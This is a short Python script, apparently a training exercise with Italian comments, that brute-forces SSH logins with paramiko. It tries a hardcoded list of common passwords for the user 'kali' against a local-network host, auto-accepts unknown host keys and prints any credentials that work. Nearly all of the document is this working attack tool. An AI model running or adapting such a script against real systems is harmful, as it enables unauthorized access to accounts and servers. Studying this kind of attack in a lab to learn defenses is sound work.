#L'esercizio di oggi richiede di scrivere un programma, 
# con un linguaggio a sua scelta tra Python e C, 
# che permetta lʼesecuzione di un attacco Brute-Force ad un servizio SSH su una macchina Debian/Ubuntu 

#importo libreria paramiko che permette di interfacciarsi con servizi SSH
import paramiko

#definisco la funzione che prova ad autenticarsi con username, hostname e password
def test_authentication(username, hostname, password):
    #creo un client SSH
    client = paramiko.SSHClient()
    #imposta la politica per accettare automaticamente chiavi sconosciute
    #autoaddpolicy accetta automaticamente la chiave del server senza chiedere conferma
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #inizia un blocco try per gestire le eccezioni
    try:
        #prova a connettersi al server SSH con username e password, se l'autenticazione funziona la connessione è stabilita
        #se la password è sbagliata viene sollevata un'eccezione di tipo AuthenticationException
        client.connect(hostname, username=username, password=password)
        # se la connessione ha successo stampo le credenziali e ritorno True 
        print(f"Authentication successful: {username}:{password}")
        return True
    
    #Se durante connect() scatta un’eccezione di tipo AuthenticationException (password errata), si entra in questo blocco except
    except paramiko.AuthenticationException:
        #Stampa che l’autenticazione è fallita, mostrando utente e password provata
        print(f"Authentication failed: {username}:{password}")
        return False
    
    #con finally chiudo la connessione
    finally:
        client.close()

#lista di password da provare
passwords = ["password", "segreta", "p4ssw0rd", "kali", "hola", "ForzaRoma", "wlosmartworking", "123456", "qwerty"]
#ciclo sulla lista di password e provo ad autenticarmi con ciascuna
for p in passwords:
    #Per ciascuna password chiama la funzione test_authentication con username = "kali", hostname = "192.168.1.95" e password = p. 
    #Se la funzione ritorna True (cioè autenticazione riuscita), entra nel corpo dell'if.
    if test_authentication("kali", "192.168.1.95", p):
        #Se l’autenticazione ha avuto successo, break esce dal ciclo: non prova altre password dopo il primo successo.
        break